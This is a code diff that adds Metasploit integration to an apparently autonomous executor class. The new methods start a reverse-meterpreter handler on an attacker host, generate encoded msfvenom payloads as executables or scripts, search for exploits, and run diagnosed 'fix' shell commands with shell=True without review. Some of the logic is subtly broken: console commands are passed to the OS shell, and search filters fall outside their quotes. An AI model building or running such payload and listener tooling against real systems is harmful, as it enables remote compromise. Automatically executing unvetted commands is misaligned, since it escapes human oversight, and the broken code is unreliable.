@@ -844,7 +844,9 @@ class DirectExecutor:
                     if (
                         file_name_lower.startswith("spectral_")
                         or file_name_lower.startswith(expected_lower)
-                        or file_name_lower.replace("_", "").startswith(expected_lower.replace("_", ""))
+                        or file_name_lower.replace("_", "").startswith(
+                            expected_lower.replace("_", "")
+                        )
                     ):
                         # Verify it's a Python file or matches the target filename
                         if file_path.suffix == ".py" or filename in file_path.name:
@@ -1055,3 +1057,326 @@ General Requirements:
 
         # Default description
         return f"Python script: {user_request[:50]}"
+
+    def execute_metasploit_command(
+        self,
+        command: str,
+        show_terminal: bool = True,
+        timeout: int = 60,
+        auto_fix: bool = True,
+    ) -> tuple[int, str]:
+        """
+        Execute a Metasploit command and capture output.
+
+        Args:
+            command: Metasploit command to execute
+            show_terminal: Whether to show terminal window
+            timeout: Command timeout in seconds
+            auto_fix: Whether to attempt autonomous fixes for common errors
+
+        Returns:
+            Tuple of (exit_code, output)
+        """
+        from spectral.knowledge import diagnose_error, get_auto_fix_command
+
+        logger.info(f"Executing Metasploit command: {command[:100]}")
+
+        # Emit GUI event for command start
+        self._emit_gui_event(
+            "command_start",
+            {"command": command, "show_terminal": show_terminal, "type": "metasploit"},
+        )
+
+        try:
+            # Execute the command
+            if show_terminal:
+                # Run with visible terminal (platform-specific)
+                if sys.platform == "win32":
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=timeout,
+                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                    )
+                else:
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=timeout,
+                    )
+            else:
+                # Run without visible terminal
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=timeout,
+                )
+
+            output = (result.stdout or "") + (result.stderr or "")
+
+            # Check for errors and attempt autonomous fixes
+            if auto_fix and result.returncode != 0:
+                # Emit GUI event for error
+                self._emit_gui_event(
+                    "command_error",
+                    {"command": command, "error": output, "exit_code": result.returncode},
+                )
+
+                # Diagnose the error
+                diagnosis, fixes = diagnose_error(output)
+
+                logger.info(f"Metasploit error diagnosed: {diagnosis}")
+                logger.info(f"Suggested fixes: {fixes}")
+
+                # Try autonomous fixes
+                for fix in fixes:
+                    logger.info(f"Attempting autonomous fix: {fix}")
+
+                    # Execute the fix command
+                    fix_result = subprocess.run(
+                        fix,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                    )
+
+                    if fix_result.returncode == 0:
+                        logger.info(f"Autonomous fix succeeded: {fix}")
+                        # Retry original command
+                        result = subprocess.run(
+                            command,
+                            shell=True,
+                            capture_output=True,
+                            text=True,
+                            timeout=timeout,
+                        )
+                        output = (result.stdout or "") + (result.stderr or "")
+
+                        if result.returncode == 0:
+                            break
+                    else:
+                        logger.warning(f"Autonomous fix failed: {fix}")
+
+            # Emit GUI event for command completion
+            self._emit_gui_event(
+                "command_complete",
+                {
+                    "command": command,
+                    "exit_code": result.returncode,
+                    "output": output,
+                },
+            )
+
+            return result.returncode, output
+
+        except subprocess.TimeoutExpired:
+            error_msg = f"Metasploit command timed out after {timeout} seconds"
+            logger.error(error_msg)
+            self._emit_gui_event("command_timeout", {"command": command, "timeout": timeout})
+            return 124, error_msg
+        except Exception as e:
+            error_msg = f"Error executing Metasploit command: {str(e)}"
+            logger.exception(error_msg)
+            self._emit_gui_event("command_error", {"command": command, "error": error_msg})
+            return 1, error_msg
+
+    def execute_metasploit_interactive(
+        self,
+        commands: List[str],
+        show_terminal: bool = True,
+        timeout_per_command: int = 30,
+    ) -> List[tuple[int, str]]:
+        """
+        Execute multiple Metasploit commands interactively.
+
+        Args:
+            commands: List of Metasploit commands to execute in sequence
+            show_terminal: Whether to show terminal window
+            timeout_per_command: Timeout for each command
+
+        Returns:
+            List of (exit_code, output) tuples for each command
+        """
+        results = []
+
+        for cmd in commands:
+            exit_code, output = self.execute_metasploit_command(
+                command=cmd,
+                show_terminal=show_terminal,
+                timeout=timeout_per_command,
+                auto_fix=True,
+            )
+            results.append((exit_code, output))
+
+            # Check if command failed critically
+            if exit_code != 0 and "[-]" in output:
+                # Critical error, stop execution
+                logger.warning(f"Critical error in command: {cmd[:50]}")
+                break
+
+        return results
+
+    def start_metasploit_listener(
+        self,
+        payload: str,
+        lhost: str,
+        lport: int,
+        show_terminal: bool = True,
+    ) -> tuple[int, str]:
+        """
+        Start a Metasploit listener for a reverse TCP payload.
+
+        Args:
+            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
+            lhost: Local host IP (attacker IP)
+            lport: Local port for listener
+            show_terminal: Whether to show terminal window
+
+        Returns:
+            Tuple of (exit_code, output)
+        """
+        logger.info(f"Starting Metasploit listener for {payload} on {lhost}:{lport}")
+
+        # Generate commands to start listener
+        commands = [
+            "use exploit/multi/handler",
+            f"set PAYLOAD {payload}",
+            f"set LHOST {lhost}",
+            f"set LPORT {lport}",
+            "set ExitOnSession false",
+            "run",
+        ]
+
+        # Execute commands
+        results = self.execute_metasploit_interactive(
+            commands=commands,
+            show_terminal=show_terminal,
+            timeout_per_command=10,
+        )
+
+        # Return result of the final 'run' command
+        return results[-1] if results else (1, "No commands executed")
+
+    def generate_metasploit_payload(
+        self,
+        payload: str,
+        lhost: str,
+        lport: int,
+        output_format: str = "exe",
+        output_path: Optional[Path] = None,
+        encoding: Optional[str] = None,
+        iterations: int = 1,
+    ) -> tuple[int, str, Optional[Path]]:
+        """
+        Generate a Metasploit payload using msfvenom.
+
+        Args:
+            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
+            lhost: Local host IP (attacker IP)
+            lport: Local port for connection
+            output_format: Output format (exe, dll, ps1, elf, etc.)
+            output_path: Path to save payload (defaults to Desktop)
+            encoding: Encoding method (e.g., shikata_ga_nai)
+            iterations: Number of encoding iterations
+
+        Returns:
+            Tuple of (exit_code, output, payload_path)
+        """
+        logger.info(f"Generating Metasploit payload: {payload}")
+
+        # Determine output path
+        if output_path is None:
+            desktop = Path.home() / "Desktop"
+            output_path = (
+                desktop / f"payload_{payload.replace('/', '_')}_{int(time.time())}.{output_format}"
+            )
+
+        # Build msfvenom command
+        cmd_parts = [
+            "msfvenom",
+            "-p",
+            payload,
+            f"LHOST={lhost}",
+            f"LPORT={lport}",
+            "-f",
+            output_format,
+            "-o",
+            str(output_path),
+        ]
+
+        # Add encoding if specified
+        if encoding:
+            cmd_parts.extend(["-e", encoding, "-i", str(iterations)])
+
+        cmd = " ".join(cmd_parts)
+
+        # Execute the command
+        exit_code, output = self.execute_metasploit_command(
+            command=cmd,
+            show_terminal=True,
+            timeout=120,
+            auto_fix=False,  # Don't auto-fix payload generation
+        )
+
+        if exit_code == 0:
+            logger.info(f"Payload generated successfully: {output_path}")
+        else:
+            logger.error(f"Payload generation failed: {output}")
+
+        return exit_code, output, output_path if exit_code == 0 else None
+
+    def search_metasploit_exploits(
+        self,
+        keyword: str,
+        platform: Optional[str] = None,
+        exploit_type: Optional[str] = None,
+    ) -> tuple[int, str, List[str]]:
+        """
+        Search for Metasploit exploits by keyword.
+
+        Args:
+            keyword: Search keyword
+            platform: Filter by platform (windows, linux, etc.)
+            exploit_type: Filter by type (exploit, auxiliary, post, etc.)
+
+        Returns:
+            Tuple of (exit_code, output, list_of_modules)
+        """
+        logger.info(f"Searching Metasploit exploits: {keyword}")
+
+        # Build search command
+        cmd = f"msfconsole -q -x 'search {keyword}'"
+
+        if platform:
+            cmd += f" platform:{platform}"
+
+        if exploit_type:
+            cmd += f" type:{exploit_type}"
+
+        # Execute search
+        exit_code, output = self.execute_metasploit_command(
+            command=cmd,
+            show_terminal=True,
+            timeout=60,
+            auto_fix=False,
+        )
+
+        # Parse results to extract module paths
+        modules = []
+        lines = output.split("\n")
+        for line in lines:
+            # Look for module paths in search results
+            if "/" in line and not line.startswith("[*]") and not line.startswith("[+]"):
+                parts = line.split()
+                for part in parts:
+                    if "/" in part and not part.startswith("["):
+                        modules.append(part)
+
+        return exit_code, output, modules
